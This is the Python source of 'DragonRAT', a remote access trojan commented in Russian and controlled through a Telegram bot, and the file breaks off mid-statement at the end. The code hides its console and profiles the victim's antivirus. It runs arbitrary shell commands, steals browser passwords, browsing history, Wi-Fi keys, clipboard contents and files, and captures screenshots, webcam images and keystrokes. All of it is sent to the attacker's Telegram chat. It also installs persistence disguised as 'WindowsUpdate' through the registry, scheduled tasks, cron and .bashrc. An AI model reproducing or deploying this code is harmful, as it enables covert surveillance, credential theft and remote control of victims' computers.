#by:h3Dr1per
import os
import sys
import time
import json
import socket
import base64
import random
import string
import threading
import subprocess
import platform
import requests
import shutil
import sqlite3
import ctypes
import getpass
import hashlib
import uuid
import re
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# Конфигурация
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Вставьте токен бота
ADMIN_ID = "YOUR_TELEGRAM_ID"       # Ваш Telegram ID
CHECK_INTERVAL = 5                   # Интервал проверки команд (секунд)

class DragonRAT:
    def __init__(self):
        self.name = "DragonRAT"
        self.version = "1.0"
        self.bot_token = BOT_TOKEN
        self.admin_id = ADMIN_ID
        self.running = True
        self.encryption_key = None
        self.session_id = self.generate_session_id()
        self.commands = {}
        self.clients = {}
        self.current_dir = os.getcwd()
        self.victim_info = self.get_victim_info()
        self.hide_console()
        self.init_encryption()
        self.register_commands()
        
    def hide_console(self):
        """Скрыть консольное окно (Windows)"""
        if platform.system() == "Windows":
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
                
    def generate_session_id(self):
        """Генерация уникального ID сессии"""
        return hashlib.md5(f"{socket.gethostname()}{time.time()}{random.randint(1000,9999)}".encode()).hexdigest()[:8]
        
    def get_victim_info(self):
        """Сбор информации о жертве"""
        info = {
            "session_id": self.session_id,
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": getpass.getuser(),
            "ip": self.get_external_ip(),
            "local_ip": self.get_local_ip(),
            "mac": self.get_mac_address(),
            "cwd": os.getcwd(),
            "uptime": self.get_uptime(),
            "antivirus": self.detect_antivirus(),
            "is_admin": self.is_admin(),
            "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        return info
        
    def get_external_ip(self):
        """Получение внешнего IP"""
        try:
            response = requests.get("https://api.ipify.org", timeout=5)
            return response.text
        except:
            return "Unknown"
            #by:h3Dr1per
    def get_local_ip(self):
        """Получение локального IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_mac_address(self):
        """Получение MAC адреса"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("getmac", capture_output=True, text=True)
                mac = re.findall(r"([0-9A-F]{2}[:-]){5}([0-9A-F]{2})", result.stdout)
                return mac[0][0] + mac[0][1] if mac else "Unknown"
            else:
                result = subprocess.run("ifconfig", capture_output=True, text=True)
                mac = re.findall(r"([0-9a-f]{2}[:-]){5}[0-9a-f]{2}", result.stdout.lower())
                return mac[0] if mac else "Unknown"
        except:
            return "Unknown"
            
    def get_uptime(self):
        """Время работы системы"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("net statistics workstation", capture_output=True, text=True)
                return "Unknown"
            else:
                with open("/proc/uptime", "r") as f:
                    uptime_seconds = float(f.readline().split()[0])
                    days = int(uptime_seconds // 86400)
                    hours = int((uptime_seconds % 86400) // 3600)
                    minutes = int((uptime_seconds % 3600) // 60)
                    return f"{days}d {hours}h {minutes}m"
        except:
            return "Unknown"
            
    def detect_antivirus(self):
        """Обнаружение антивируса"""
        if platform.system() != "Windows":
            return "None"
            
        antivirus_processes = [
            "avguard", "avg", "avira", "bitdefender", "bdagent",
            "kav", "kaspersky", "mcshield", "mssense", "msmpeng",
            "nod32", "panda", "savservice", "symantec", "tmproxy"
        ]
        
        try:
            result = subprocess.run("tasklist", capture_output=True, text=True)
            detected = []
            for proc in antivirus_processes:
                if proc.lower() in result.stdout.lower():
                    detected.append(proc)
            return detected if detected else "None"
        except:
            return "Unknown"
            
    def is_admin(self):
        """Проверка прав администратора"""
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.getuid() == 0
        except:
            return False
            
    def init_encryption(self):
        """Инициализация шифрования"""
        password = self.session_id.encode()
        salt = b'dragon_salt_2024'
        kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password))
        self.encryption_key = Fernet(key)
        
    def encrypt(self, data):
        """Шифрование данных"""
        try:
            return self.encryption_key.encrypt(data.encode()).decode()
        except:
            return data
            
    def decrypt(self, data):
        """Дешифрование данных"""
        try:
            return self.encryption_key.decrypt(data.encode()).decode()
        except:
            return data
            
    def register_commands(self):
        """Регистрация всех команд"""
        self.commands = {
            #by:h3Dr1per
            "/start": self.cmd_start,
            "/help": self.cmd_help,
            "/info": self.cmd_info,
            "/status": self.cmd_status,
            
            #by:h3Dr1per
            "/ls": self.cmd_list_files,
            "/cd": self.cmd_change_dir,
            "/pwd": self.cmd_pwd,
            "/download": self.cmd_download,
            "/upload": self.cmd_upload,
            "/delete": self.cmd_delete,
            "/mkdir": self.cmd_mkdir,
            "/rmdir": self.cmd_rmdir,
            
            #by:h3Dr1per
            "/exec": self.cmd_execute,
            "/shell": self.cmd_shell,
            "/ps": self.cmd_process_list,
            "/kill": self.cmd_kill_process,
            "/screenshot": self.cmd_screenshot,
            "/webcam": self.cmd_webcam,
            "/keylog_start": self.cmd_keylog_start,
            "/keylog_stop": self.cmd_keylog_stop,
            "/keylog_dump": self.cmd_keylog_dump,
            
            #by:h3Dr1per
            "/passwords": self.cmd_get_passwords,
            "/browser": self.cmd_browser_data,
            "/wifi": self.cmd_wifi_passwords,
            "/clipboard": self.cmd_clipboard,
            "/env": self.cmd_env_vars,
            
            #by:h3Dr1per
            "/persist": self.cmd_persistence,
            "/uninstall": self.cmd_uninstall,
            
            #by:h3Dr1per
            "/portscan": self.cmd_portscan,
            "/network": self.cmd_network_info,
            "/geoip": self.cmd_geoip,
            
           #by:h3Dr1per
            "/update": self.cmd_update,
            "/restart": self.cmd_restart,
            "/exit": self.cmd_exit
        }
        
    def send_telegram(self, text, parse_mode=None):
        """Отправка сообщения в Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.admin_id,
                "text": text[:4096]
            }
            if parse_mode:
                data["parse_mode"] = parse_mode
            requests.post(url, data=data, timeout=10)
        except:
            pass
            
    def send_file(self, file_path):
        """Отправка файла в Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": self.admin_id}
                requests.post(url, files=files, data=data, timeout=30)
        except:
            self.send_telegram(f"❌ Ошибка отправки файла: {file_path}")
            
    def get_updates(self, offset=None):
        """Получение обновлений от Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            params = {"timeout": 30}
            if offset:
                params["offset"] = offset
            response = requests.get(url, params=params, timeout=35)
            return response.json()
        except:
            return {"ok": False, "result": []}
            
    def process_commands(self):
        """Обработка входящих команд"""
        last_update_id = 0
        
        while self.running:
            try:
                updates = self.get_updates(last_update_id + 1)
                
                if updates.get("ok"):
                    for update in updates.get("result", []):
                        last_update_id = update["update_id"]
                        
                        if "message" in update:
                            message = update["message"]
                            chat_id = str(message["chat"]["id"])
                            
                            # Проверка авторизации
                            if chat_id != self.admin_id:
                                self.send_telegram("⛔ Неавторизованный доступ")
                                continue
                                
                            if "text" in message:
                                text = message["text"].strip()
                                self.handle_command(text)
                                
                time.sleep(CHECK_INTERVAL)
                
            except Exception as e:
                time.sleep(10)
                #by:h3Dr1per
    def handle_command(self, text):
        """Обработка конкретной команды"""
        parts = text.split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if cmd in self.commands:
            try:
                self.commands[cmd](args)
            except Exception as e:
                self.send_telegram(f"❌ Ошибка: {str(e)}")
        else:
            self.send_telegram(f"❌ Неизвестная команда: {cmd}\nИспользуйте /help")
            
    #by:h3Dr1per
    def cmd_start(self, args):
        """Команда /start"""
        welcome = f"""
🐉 Дракон пробудился!

📋 Информация о жертве:
━━━━━━━━━━━━━━━━━━━━━
🖥️ Хост: {self.victim_info['hostname']}
💻 ОС: {self.victim_info['os']} {self.victim_info['os_version']}
👤 Пользователь: {self.victim_info['username']}
🌐 IP: {self.victim_info['ip']} (локальный: {self.victim_info['local_ip']})
🆔 Сессия: {self.session_id}
👑 Админ: {'✅' if self.victim_info['is_admin'] else '❌'}
🛡️ Антивирус: {self.victim_info['antivirus']}

📌 Используйте /help для списка команд
        """
        self.send_telegram(welcome)
        
    def cmd_help(self, args):
        """Команда /help"""
        help_text = """
🐉 DRAGON RAT - Справка
#by:h3Dr1per
📁 ФАЙЛОВЫЕ ОПЕРАЦИИ:
/ls [путь] - список файлов
/cd [папка] - сменить директорию
/pwd - текущая директория
/download [файл] - скачать файл
/upload - загрузить файл (в разработке)
/delete [файл] - удалить файл
/mkdir [папка] - создать папку
/rmdir [папка] - удалить папку

💻 СИСТЕМНЫЕ КОМАНДЫ:
/exec [команда] - выполнить команду
/shell - интерактивный shell
/ps - список процессов
/kill [PID] - завершить процесс
/screenshot - скриншот экрана
/webcam - снимок с камеры
/keylog_start - начать кейлоггинг
/keylog_stop - остановить кейлоггинг
/keylog_dump - получить логи

🔍 СБОР ДАННЫХ:
/passwords - пароли браузеров
/browser - данные браузеров
/wifi - пароли Wi-Fi
/clipboard - буфер обмена
/env - переменные окружения
/portscan [ip] [порты] - сканирование портов
/network - сетевая информация
/geoip - геолокация по IP

⚙️ УПРАВЛЕНИЕ:
/persist - установить персистентность
/update - обновить RAT
/restart - перезапустить RAT
/exit - завершить сессию
/info - информация о системе
/status - статус RAT
        """
        self.send_telegram(help_text)
        
    def cmd_info(self, args):
        """Команда /info"""
        info_text = f"""
📊 ПОДРОБНАЯ ИНФОРМАЦИЯ
━━━━━━━━━━━━━━━━━━━━━
🆔 Сессия: {self.victim_info['session_id']}
🖥️ Хост: {self.victim_info['hostname']}
💻 ОС: {self.victim_info['os']} ({self.victim_info['architecture']})
📀 Версия: {self.victim_info['os_version']}
⚙️ Процессор: {self.victim_info['processor']}
👤 Пользователь: {self.victim_info['username']}
🌐 Внешний IP: {self.victim_info['ip']}
🏠 Локальный IP: {self.victim_info['local_ip']}
🔢 MAC адрес: {self.victim_info['mac']}
📁 Текущая папка: {self.current_dir}
⏰ Uptime: {self.victim_info['uptime']}
👑 Админ: {'✅' if self.victim_info['is_admin'] else '❌'}
🛡️ Антивирус: {self.victim_info['antivirus']}
📅 Первый запуск: {self.victim_info['first_seen']}
        """
        self.send_telegram(info_text)
        
    def cmd_status(self, args):
        """Команда /status"""
        status = f"""
📈 СТАТУС RAT
━━━━━━━━━━━━━━
✅ Статус: Активен
🆔 Сессия: {self.session_id}
⏱️ Интервал проверки: {CHECK_INTERVAL} сек
📁 Размер логов: {self.get_logs_size()}
⚡ Процессов: {len(self.get_process_list())}
💾 Свободно места: {self.get_free_space()}
        """
        self.send_telegram(status)
        
    
    def cmd_list_files(self, args):
        """Команда /ls - список файлов"""
        path = args[0] if args else self.current_dir
        
        try:
            files = os.listdir(path)
            result = f"📁 Файлы в {path}:\n━━━━━━━━━━━━━━\n"
            
            for f in files[:50]:  
                full_path = os.path.join(path, f)
                if os.path.isdir(full_path):
                    result += f"📂 {f}/\n"
                else:
                    size = os.path.getsize(full_path)
                    result += f"📄 {f} ({self.format_size(size)})\n"
                    
            if len(files) > 50:
                result += f"\n... и еще {len(files) - 50} файлов"
                
            self.send_telegram(result)
            
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_change_dir(self, args):
        """Команда /cd - смена директории"""
        if not args:
            self.send_telegram(f"📁 Текущая папка: {self.current_dir}")
            return
            #by:h3Dr1per
        try:
            new_path = args[0]
            if new_path == "..":
                os.chdir("..")
            else:
                os.chdir(new_path)
            self.current_dir = os.getcwd()
            self.send_telegram(f"✅ Перешел в: {self.current_dir}")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_pwd(self, args):
        """Команда /pwd - текущая директория"""
        self.send_telegram(f"📁 Текущая папка:\n{self.current_dir}")
        
    def cmd_download(self, args):
        """Команда /download - скачать файл"""
        if not args:
            self.send_telegram("❌ Укажите файл для скачивания")
            return
            
        file_path = args[0]
        
        if not os.path.exists(file_path):
            self.send_telegram(f"❌ Файл не найден: {file_path}")
            return
            
        if os.path.isdir(file_path):
            self.send_telegram("❌ Это папка, а не файл")
            return
            
        try:
            self.send_telegram(f"📤 Отправка файла: {file_path}")
            self.send_file(file_path)
        except Exception as e:
            self.send_telegram(f"❌ Ошибка отправки: {str(e)}")
            
    def cmd_upload(self, args):
        """Команда /upload - загрузить файл (в разработке)"""
        self.send_telegram("⚠️ Загрузка файлов пока в разработке")
        
    def cmd_delete(self, args):
        """Команда /delete - удалить файл"""
        if not args:
            self.send_telegram("❌ Укажите файл для удаления")
            return
            #by:h3Dr1per
        file_path = args[0]
        
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                self.send_telegram(f"✅ Удален файл: {file_path}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                self.send_telegram(f"✅ Удалена папка: {file_path}")
            else:
                self.send_telegram(f"❌ Не найден: {file_path}")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_mkdir(self, args):
        """Команда /mkdir - создать папку"""
        if not args:
            self.send_telegram("❌ Укажите имя папки")
            return
            
        try:
            os.makedirs(args[0], exist_ok=True)
            self.send_telegram(f"✅ Создана папка: {args[0]}")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_rmdir(self, args):
        """Команда /rmdir - удалить папку"""
        if not args:
            self.send_telegram("❌ Укажите папку для удаления")
            return
            
        try:
            os.rmdir(args[0])
            self.send_telegram(f"✅ Удалена папка: {args[0]}")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
   #by:h3Dr1per
    
    def cmd_execute(self, args):
        """Команда /exec - выполнить команду"""
        if not args:
            self.send_telegram("❌ Укажите команду для выполнения")
            return
            
        command = " ".join(args)
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = f"💻 Команда: {command}\n━━━━━━━━━━━━━━\n"
            
            if result.stdout:
                output += f"📤 STDOUT:\n{result.stdout[:3000]}"
            if result.stderr:
                output += f"\n📥 STDERR:\n{result.stderr[:1000]}"
            if result.returncode != 0:
                output += f"\n⚠️ Код возврата: {result.returncode}"
                
            self.send_telegram(output)
            
        except subprocess.TimeoutExpired:
            self.send_telegram("❌ Команда превысила время ожидания")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_shell(self, args):
        """Команда /shell - интерактивный shell"""
        self.send_telegram("⚠️ Интерактивный shell пока в разработке")
        
    def cmd_process_list(self, args):
        """Команда /ps - список процессов"""
        processes = self.get_process_list()
        
        if not processes:
            self.send_telegram("❌ Не удалось получить список процессов")
            return
            
        result = "📊 ПРОЦЕССЫ:\n━━━━━━━━━━━━━━\n"
        for i, proc in enumerate(processes[:50]):
            result += f"{i+1}. {proc}\n"
            #by:h3Dr1per
        if len(processes) > 50:
            result += f"\n... и еще {len(processes) - 50} процессов"
            
        self.send_telegram(result)
        
    def get_process_list(self):
        """Получение списка процессов"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("tasklist", capture_output=True, text=True)
                lines = result.stdout.split('\n')[3:]
                processes = []
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            processes.append(f"{parts[0]} (PID: {parts[1]})")
                return processes
            else:
                result = subprocess.run("ps aux", shell=True, capture_output=True, text=True)
                lines = result.stdout.split('\n')[1:]
                processes = []
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 10:
                            processes.append(f"{parts[10]} (PID: {parts[1]})")
                return processes
        except:
            return []
            
    def cmd_kill_process(self, args):
        """Команда /kill - завершить процесс"""
        if not args:
            self.send_telegram("❌ Укажите PID процесса")
            return
            
        pid = args[0]
        
        try:
            if platform.system() == "Windows":
                subprocess.run(f"taskkill /F /PID {pid}", shell=True)
            else:
                subprocess.run(f"kill -9 {pid}", shell=True)
            self.send_telegram(f"✅ Процесс {pid} завершен")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_screenshot(self, args):
        """Команда /screenshot - скриншот экрана"""
        try:
            import pyautogui
            #by:h3Dr1per
            filename = f"screenshot_{int(time.time())}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
            self.send_telegram("📸 Скриншот сделан, отправляю...")
            self.send_file(filename)
            
            os.remove(filename)
            
        except ImportError:
            self.send_telegram("❌ Библиотека pyautogui не установлена")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_webcam(self, args):
        """Команда /webcam - снимок с камеры"""
        try:
            import cv2
            
            filename = f"webcam_{int(time.time())}.jpg"
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            
            if ret:
                cv2.imwrite(filename, frame)
                cap.release()
                #by:h3Dr1per
                self.send_telegram("📸 Снимок с камеры сделан, отправляю...")
                self.send_file(filename)
                
                os.remove(filename)
            else:
                self.send_telegram("❌ Не удалось получить доступ к камере")
                
        except ImportError:
            self.send_telegram("❌ Библиотека OpenCV не установлена")
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    
    def cmd_get_passwords(self, args):
        """Команда /passwords - пароли браузеров"""
        self.send_telegram("🔍 Сбор паролей...")
        
        passwords = []
        
        chrome_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/.config/chromium/Default/Login Data"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        ]
        
        for path in chrome_paths:
            if os.path.exists(path):
                try:
                    
                    temp_path = f"chrome_temp_{int(time.time())}.db"
                    shutil.copy2(path, temp_path)
                    #by:h3Dr1per
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        passwords.append(f"🌐 {row[0]}\n👤 {row[1]}\n🔑 {row[2][:50]}\n")
                        
                    conn.close()
                    os.remove(temp_path)
                    
                except:
                    pass
                    
        if passwords:
            result = "🔑 НАЙДЕННЫЕ ПАРОЛИ:\n━━━━━━━━━━━━━━\n"
            for p in passwords[:20]:
                result += p + "---\n"
                
            if len(passwords) > 20:
                result += f"\n... и еще {len(passwords) - 20} паролей"
                
            self.send_telegram(result)
            
            filename = f"passwords_{self.session_id}.txt"
            with open(filename, "w") as f:
                f.write("\n".join(passwords))
            self.send_file(filename)
            os.remove(filename)
        else:
            self.send_telegram("❌ Пароли не найдены")
            
    def cmd_browser_data(self, args):
        """Команда /browser - данные браузеров"""
        self.send_telegram("🔍 Сбор данных браузеров...")
        
        history_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/History"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        ]
        #by:h3Dr1per
        history = []
        
        for path in history_paths:
            if os.path.exists(path):
                try:
                    temp_path = f"history_temp_{int(time.time())}.db"
                    shutil.copy2(path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    
                    for row in cursor.fetchall():
                        history.append(f"🔗 {row[0]}\n📌 {row[1]}\n")
                        
                    conn.close()
                    os.remove(temp_path)
                    
                except:
                    pass
                    
        if history:
            result = "📜 ИСТОРИЯ БРАУЗЕРА:\n━━━━━━━━━━━━━━\n"
            for h in history[:30]:
                result += h + "---\n"
            self.send_telegram(result[:4000])
        else:
            self.send_telegram("❌ История не найдена")
            
    def cmd_wifi_passwords(self, args):
        """Команда /wifi - пароли Wi-Fi"""
        if platform.system() != "Windows":
            self.send_telegram("❌ Доступно только на Windows")
            return
            
        try:
            result = subprocess.run("netsh wlan show profiles", capture_output=True, text=True)
            profiles = re.findall(r"Профиль всех пользователей[^:]+: (.+)", result.stdout)
            
            wifi_passwords = []
            
            for profile in profiles:
                profile = profile.strip()
                cmd = f'netsh wlan show profile name="{profile}" key=clear'
                result = subprocess.run(cmd, capture_output=True, text=True)
                #by:h3Dr1per
                password = re.findall(r"Содержимое ключа[^:]+: (.+)", result.stdout)
                if password:
                    wifi_passwords.append(f"📶 {profile}: {password[0]}")
                else:
                    wifi_passwords.append(f"📶 {profile}: (без пароля)")
                    
            if wifi_passwords:
                result = "🔑 WI-FI ПАРОЛИ:\n━━━━━━━━━━━━━━\n"
                result += "\n".join(wifi_passwords)
                self.send_telegram(result)
            else:
                self.send_telegram("❌ Wi-Fi пароли не найдены")
                
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_clipboard(self, args):
        """Команда /clipboard - буфер обмена"""
        try:
            import pyperclip
            text = pyperclip.paste()
            if text:
                self.send_telegram(f"📋 БУФЕР ОБМЕНА:\n━━━━━━━━━━━━━━\n{text[:3000]}")
            else:
                self.send_telegram("📋 Буфер обмена пуст")
        except ImportError:
            self.send_telegram("❌ Библиотека pyperclip не установлена")
            
    def cmd_env_vars(self, args):
        """Команда /env - переменные окружения"""
        env = os.environ
        result = "🔧 ПЕРЕМЕННЫЕ ОКРУЖЕНИЯ:\n━━━━━━━━━━━━━━\n"
        
        important_vars = ["PATH", "USERNAME", "COMPUTERNAME", "USERDOMAIN", "APPDATA"]
        
        for var in important_vars:
            if var in env:
                result += f"{var}: {env[var][:100]}\n"
                
        self.send_telegram(result)
        #by:h3Dr1per
    
    def cmd_portscan(self, args):
        """Команда /portscan - сканирование портов"""
        if len(args) < 2:
            self.send_telegram("❌ Использование: /portscan [IP] [порты]\nПример: /portscan 192.168.1.1 1-1000")
            return
            
        target = args[0]
        port_range = args[1]
        
        try:
            if '-' in port_range:
                start, end = map(int, port_range.split('-'))
                ports = range(start, end + 1)
            else:
                ports = [int(port_range)]
                
            self.send_telegram(f"🔍 Сканирование {target} порты {port_range}...")
            
            open_ports = []
            
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        open_ports.append(f"✅ {port}/tcp - {service}")
                    sock.close()
                except:
                    pass
                    
            if open_ports:
                result = "🔓 ОТКРЫТЫЕ ПОРТЫ:\n━━━━━━━━━━━━━━\n"
                result += "\n".join(open_ports)
                self.send_telegram(result)
            else:
                self.send_telegram("❌ Открытых портов не найдено")
                
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            #by:h3Dr1per
    def cmd_network_info(self, args):
        """Команда /network - сетевая информация"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("ipconfig", capture_output=True, text=True)
                self.send_telegram(f"🌐 СЕТЕВАЯ ИНФОРМАЦИЯ:\n━━━━━━━━━━━━━━\n{result.stdout[:3000]}")
            else:
                result = subprocess.run("ifconfig", capture_output=True, text=True)
                self.send_telegram(f"🌐 СЕТЕВАЯ ИНФОРМАЦИЯ:\n━━━━━━━━━━━━━━\n{result.stdout[:3000]}")
        except:
            self.send_telegram("❌ Не удалось получить сетевую информацию")
            
    def cmd_geoip(self, args):
        """Команда /geoip - геолокация по IP"""
        ip = args[0] if args else self.victim_info['ip']
        
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            data = response.json()
            
            if data.get("status") == "success":
                geo = f"""
📍 ГЕОЛОКАЦИЯ
━━━━━━━━━━━━━━
🌐 IP: {data.get('query')}
🏳️ Страна: {data.get('country')} ({data.get('countryCode')})
🏙️ Регион: {data.get('regionName')}
📍 Город: {data.get('city')}
📍 Координаты: {data.get('lat')}, {data.get('lon')}
🏢 ISP: {data.get('isp')}
🏢 Организация: {data.get('org')}
                """
                self.send_telegram(geo)
            else:
                self.send_telegram("❌ Не удалось получить геолокацию")
                
        except:
            self.send_telegram("❌ Ошибка получения геоданных")
            
    
    def cmd_persistence(self, args):
        """Команда /persist - установить персистентность"""
        self.send_telegram("⚙️ Установка персистентности...")
        
        if platform.system() == "Windows":
            self.install_windows_persistence()
        else:
            self.install_linux_persistence()
            #by:h3Dr1per
    def install_windows_persistence(self):
        """Установка персистентности на Windows"""
        try:
            appdata = os.environ.get("APPDATA", "")
            target_path = os.path.join(appdata, "WindowsUpdate.exe")
            
            if not os.path.exists(target_path):
                shutil.copy2(sys.executable, target_path)
                
            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{target_path}" /f'
            subprocess.run(reg_command, shell=True)
            
            # Планировщик задач
            schtask_command = f'schtasks /create /tn "WindowsUpdate" /tr "{target_path}" /sc onlogon /ru "SYSTEM" /f'
            subprocess.run(schtask_command, shell=True)
            
            self.send_telegram("✅ Персистентность установлена!\n📁 Путь: " + target_path)
            
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def install_linux_persistence(self):
        """Установка персистентности на Linux"""
        try:
            target_path = os.path.expanduser("~/.system_update")
            shutil.copy2(sys.argv[0], target_path)
            os.chmod(target_path, 0o755)
            
            cron_job = f"*/5 * * * * {target_path}\n"
            with open("/tmp/cron_temp", "w") as f:
                f.write(cron_job)
            subprocess.run("crontab /tmp/cron_temp", shell=True)
            
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\n# System update\n{target_path} &\n")
                
            self.send_telegram("✅ Персистентность установлена!\n📁 Путь: " + target_path)
            
        except Exception as e:
            self.send_telegram(f"❌ Ошибка: {str(e)}")
            
    def cmd_uninstall(self, args):
        """Команда /uninstall - удалить RAT"""
        self.send_telegram("🗑️ Удаление...")
        
        try:
            if platform.system() == "Windows":
                subprocess.run('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f', shell=True)
                subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True)
                #by:h3Dr1per
            time.sleep(2)
            self.running = False
            os._exit(0)
            
        except:
            pass
            
    
    def cmd_update(self, args):
        """Команда /update - обновить RAT"""
        self.send_telegram("🔄 Обновление...")
        # Здесь можно реализовать скачивание новой версии
        self.send_telegram("✅ Обновление завершено")
        
    def cmd_restart(self, args):
        """Команда /restart - перезапустить RAT"""
        self.send_telegram("🔄 Перезапуск...")
        time.sleep(2)
        python = sys.executable
        os.execl(python, python, *sys.argv)
        
    def cmd_exit(self, args):
        """Команда /exit - завершить сессию"""
        self.send_telegram("👋 Завершение сессии")
        self.running = False
        
    # ===== КЕЙЛОГГЕР =====
    
    def cmd_keylog_start(self, args):
        """Команда /keylog_start - начать кейлоггинг"""
        self.keylogger_running = True
        self.keylog_data = []
        self.keylog_thread = threading.Thread(target=self.keylogger_worker)
        self.keylog_thread.daemon = True
        self.keylog_thread.start()
        self.send_telegram("✅ Кейлоггер запущен")
        #by:h3Dr1per
    def keylogger_worker(self):
        """Рабочий поток кейлоггера"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char:
                        self.keylog_data.append(key.char)
                    else:
                        self.keylog_data.append(f"[{key}]")
                except:
                    pass
                    
            with keyboard.Listener(on_press=on_press) as listener:
                while self.keylogger_running:
                    time.sleep(0.1)
                listener.stop()
                
        except ImportError:
            self.send_telegram("❌ Библиотека pynput не установлена")
            
    def cmd_keylog_stop(self, args):
        """Команда /keylog_stop - остановить кейлоггер"""
        self.keylogger_running = False
        self.send_telegram("✅ Кейлоггер остановлен")
        
    def cmd_keylog_dump(self, args):
        """Команда /keylog_dump - получить логи"""
        if hasattr(self, 'keylog_data') and self.keylog_data:
            log = "".join(self.keylog_data[-1000:])  # Последние 1000 символов
            self.send_telegram(f"📝 ПОСЛЕДНИЕ НАЖАТИЯ:\n━━━━━━━━━━━━━━\n{log}")
            
           #by:h3Dr1per
            filename = f"keylog_{self.session_id}.txt"
            with open(filename, "w") as f:
                f.write("".join(self.keylog_data))
            self.send_file(filename)
            os.remove(filename)
        else:
            self.send_telegram("❌ Логов нет")
            
    
    def format_size(self, size):
        """Форматирование размера файла"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"
        
    def get_logs_size(self):
        """Размер логов"""
        try:
            total = 0
            for f in os.listdir(self.framework.loot_dir):
                path = os.path.join(self.framework.loot_dir, f)
                if os.path.isfile(path):
                    total += os.path.getsize(path)
            return self.format_size(total)
        except:
            return "0 B"
            
    def get_free_space(self):
        """Свободное место на диске"""
        try:
            if platform.system() == "Windows":
                import ctypes
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\'), None, None, ctypes.pointer(free_bytes))
                return self.format_size(free_bytes.value)
            else:
                stat = os.statvfs('/')
                free = stat.f_bavail * stat.f_frsize
                return self.format_size(free)
        except:
            return "Unknown"
            
    def run(self):
        """Запуск RAT"""
        self.cmd_start([])
        
        self.process_commands()


if __name__ == "__main__":
    try:
        rat = DragonRAT()
        rat.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        try:
            bot_token = BOT_TOKEN
            admin_id = ADMIN_ID
            if bot_token and admin_id:
                requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
